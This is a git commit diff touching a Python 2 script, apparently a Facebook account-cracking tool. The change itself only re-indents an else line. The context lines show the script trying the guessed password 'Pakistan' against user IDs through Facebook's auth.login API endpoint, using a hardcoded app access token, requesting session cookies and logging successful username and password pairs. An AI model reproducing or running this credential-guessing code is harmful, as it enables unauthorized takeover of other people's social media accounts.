975e87983528fd88acde9b9b8a5cbd8eaa097bbf
Jam302 <65140038+Jam302@users.noreply.github.com>
2020-05-21 01:00:03 +0500

    Update mishu.py

--- mishu.py
+++ mishu.py
@@ -309,7 +309,7 @@ def pilih_super():
                                 if 'access_token' in q:
                                 print '\x1b[1;97mSuccessful\x1b[1;97m-\x1b[1;97m▬\x1b[1;97m-' + user + '-\x1b[1;97m▬\x1b[1;97m-' + pass2
                                 oks.append(user+pass2)
-                         else:
+                                else:
 					pass3 = 'Pakistan'
 					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 					q = json.load(data)
